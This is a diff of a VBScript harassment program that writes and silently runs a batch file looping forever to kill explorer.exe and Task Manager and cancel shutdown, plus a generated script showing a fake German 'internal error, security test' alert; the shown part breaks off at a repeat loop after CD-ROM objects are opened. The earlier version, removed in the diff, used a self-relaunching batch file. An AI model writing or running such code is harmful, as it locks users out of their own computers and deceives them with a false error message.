@@ -1,6 +1,5 @@
-Const PAYLOAD1 = "@echo off && taskkill /F /IM Taskmgr.exe"
-Const PAYLOAD2 = "%0" 
-Const CHILD = "killer.bat"
+Const CHILDBAT = "killer.bat"
+Const CHILDVBS = "alertbox.vbs"
 Const REPEATER = 100000
 Const ForWriting = 2
 Const Create = true
@@ -8,15 +7,24 @@ Const Create = true
 Set oWMP = CreateObject("WMPlayer.OCX" )
 Set colCDROMs = oWMP.cdromCollection
 Set objFSO = Wscript.CreateObject("Scripting.FileSystemObject")
-Set objFile = objFSO.OpenTextFile(CHILD, ForWriting, Create)
+Set objFile = objFSO.OpenTextFile(CHILDBAT, ForWriting, Create)
+Set msgFile = objFSO.OpenTextFile(CHILDVBS, ForWriting, Create)
 
-objFile.WriteLine PAYLOAD1
-objFile.WriteLine PAYLOAD2
+objFile.WriteLine "@echo off"
+objFile.WriteLine ":loop"
+objFile.WriteLine "taskkill /F /IM explorer.exe"
+objFile.WriteLine "taskkill /F /IM Taskmgr.exe"
+objFile.WriteLine "shutdown /a"
+objFile.WriteLine "cscript alertbox.vbs"
+objFile.WriteLine "goto loop"
 objFile.close
+msgFile.WriteLine 'MsgBox("Interner Fehler. Sicherheitstest wird gestartet...", vbCritical)'
+msgFile.close
 Set objFile = nothing
+Set msgFile = nothing
 Set objFSO = nothing
 
-CreateObject("Wscript.Shell").Run """" & CHILD & """", 0, False
+CreateObject("Wscript.Shell").Run """" & CHILDBAT & """", 0, False
 
 repeat = 10
 For x=0 to repeat
